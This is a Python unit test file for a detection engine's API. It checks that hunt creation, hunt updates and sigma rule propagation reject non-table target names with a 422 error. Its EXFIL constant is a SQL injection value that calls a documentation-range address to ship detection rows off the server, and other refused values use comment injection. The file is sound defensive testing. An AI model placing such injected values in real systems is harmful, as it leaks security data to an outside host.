#  Project:      dfe-engine
#  File:         tests/unit/test_api/test_hunt_target_table_api.py
#  Purpose:      Every API path that writes a hunt refuses a target that is not a table name
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""Hunt create, hunt update and sigma propagation answer 422 for a non-table target.

The hunt runner splices the target into ``INSERT INTO``, so a target such as
``FUNCTION url(...)`` would send every detection row off the box. Nothing is
written when the target is refused. The address is in the documentation range
(RFC 5737).
"""

import pytest

from dfe_engine.gitcrud import GitCrud, default_registry
from dfe_engine.gitops.repo import GitopsRepo

EXFIL = "FUNCTION url('http://203.0.113.9/x', 'JSONEachRow') -- .x"

_HUNT = {
    "display_name": "Certutil Abuse",
    "cron": "*/5 * * * *",
    "customers": ["org_a"],
    "global_source_table_name": "dfe.main",
    "rules": ["certutil"],
}

REFUSED = [EXFIL, "dfe.detection results", "dfe.detection()", "dfe.detection -- x", "a.b.c"]


@pytest.mark.parametrize("target", REFUSED)
def test_creating_a_hunt_with_a_non_table_target_is_refused(client, admin_headers, target):
    resp = client.post(
        "/api/v1/hunts",
        json={"name": "windows_hunt", **_HUNT, "global_target_table_name": target},
        headers=admin_headers,
    )

    assert resp.status_code == 422, resp.text
    assert "is not a table name" in resp.json()["message"]
    assert client.get("/api/v1/hunts/windows_hunt", headers=admin_headers).status_code == 404


@pytest.mark.parametrize("target", ["dfe.detection", "detection"])
def test_creating_a_hunt_with_a_plain_target_is_saved(client, admin_headers, target):
    resp = client.post(
        "/api/v1/hunts",
        json={"name": "windows_hunt", **_HUNT, "global_target_table_name": target},
        headers=admin_headers,
    )

    assert resp.status_code == 201, resp.text
    assert resp.json()["global_target_table_name"] == target


def test_updating_a_hunt_to_a_non_table_target_is_refused_and_keeps_the_old_one(
    client, admin_headers
):
    created = client.post(
        "/api/v1/hunts",
        json={"name": "windows_hunt", **_HUNT, "global_target_table_name": "dfe.detection"},
        headers=admin_headers,
    )
    assert created.status_code == 201, created.text

    resp = client.put(
        "/api/v1/hunts/windows_hunt",
        json={**_HUNT, "global_target_table_name": EXFIL},
        headers=admin_headers,
    )

    assert resp.status_code == 422, resp.text
    assert "is not a table name" in resp.json()["message"]
    stored = client.get("/api/v1/hunts/windows_hunt", headers=admin_headers).json()
    assert stored["global_target_table_name"] == "dfe.detection"


def test_propagating_sigma_rules_into_a_non_table_target_is_refused(
    client, app, admin_headers, tmp_path
):
    app.state.gitcrud = GitCrud(
        GitopsRepo(local_path=str(tmp_path / "deploy"), push=False), default_registry()
    )

    resp = client.post(
        "/api/v1/sigma/propagate", json={"hunt_target_table": EXFIL}, headers=admin_headers
    )

    assert resp.status_code == 422, resp.text
    assert "is not a table name" in resp.text
